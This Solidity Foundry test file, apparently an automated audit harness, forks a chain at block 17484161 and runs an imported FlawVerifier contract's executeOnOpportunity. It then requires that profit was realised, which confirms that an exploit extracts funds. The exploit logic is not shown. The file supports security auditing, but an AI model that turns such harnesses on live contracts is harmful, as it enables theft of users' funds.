// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/FlawVerifier.sol";

interface Vm {
    function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256);
    function envString(string calldata name) external returns (string memory);
}

address constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));

contract ExploitPOC {
    Vm internal constant vm = Vm(HEVM_ADDRESS);

    function testExploit() external {
        vm.createSelectFork(vm.envString("AUDITHOUND_RPC_URL"), 17484161);

        FlawVerifier verifier = new FlawVerifier();
        verifier.executeOnOpportunity();

        require(verifier.profitAmount() > 0, "no profit realized");
        require(verifier.profitToken() != address(0), "profit token unset");
    }
